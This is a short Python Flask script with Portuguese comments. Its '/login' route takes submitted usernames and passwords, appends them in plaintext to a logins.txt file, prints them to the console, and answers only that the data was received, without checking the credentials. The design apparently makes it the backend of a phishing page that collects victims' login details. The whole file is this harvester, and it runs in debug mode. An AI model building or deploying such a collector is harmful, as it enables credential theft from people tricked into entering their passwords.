from flask import Flask, request, render_template
import os

# CRIAR o app primeiro
app = Flask(__name__)

# Página inicial
@app.route('/')
def index():
    return render_template('index.html')

# Receber dados
@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    password = request.form.get('pass')

    caminho = os.path.join(os.getcwd(), "logins.txt")

    with open(caminho, "a") as f:
        f.write(f"Usuário: {user} | Senha: {password}\n")

    print(f"[SALVO] {user} | {password}")

    return "<h3>Dados recebidos com sucesso</h3>"

# Rodar servidor
if __name__ == '__main__':
    app.run(debug=True)
